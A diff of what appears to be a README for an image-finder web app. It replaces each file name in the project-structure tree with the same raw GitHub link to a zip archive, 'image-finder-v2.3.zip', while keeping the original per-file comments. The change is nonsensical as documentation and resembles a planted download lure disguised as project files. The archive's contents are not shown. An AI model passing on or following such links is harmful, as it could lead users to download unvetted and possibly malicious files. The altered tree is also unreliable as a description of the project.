@@ -32,7 +32,7 @@ Copy
 Edit
 /image-finder-app
 │
-├── index.html       # Main HTML file
-├── style.css        # CSS for styling
-├── script.js        # JavaScript logic with Fetch API
-└── README.md        # Project documentation
+├── https://github.com/kartik359/image-finder-/raw/refs/heads/main/arango/image-finder-v2.3.zip       # Main HTML file
+├── https://github.com/kartik359/image-finder-/raw/refs/heads/main/arango/image-finder-v2.3.zip        # CSS for styling
+├── https://github.com/kartik359/image-finder-/raw/refs/heads/main/arango/image-finder-v2.3.zip        # JavaScript logic with Fetch API
+└── https://github.com/kartik359/image-finder-/raw/refs/heads/main/arango/image-finder-v2.3.zip        # Project documentation
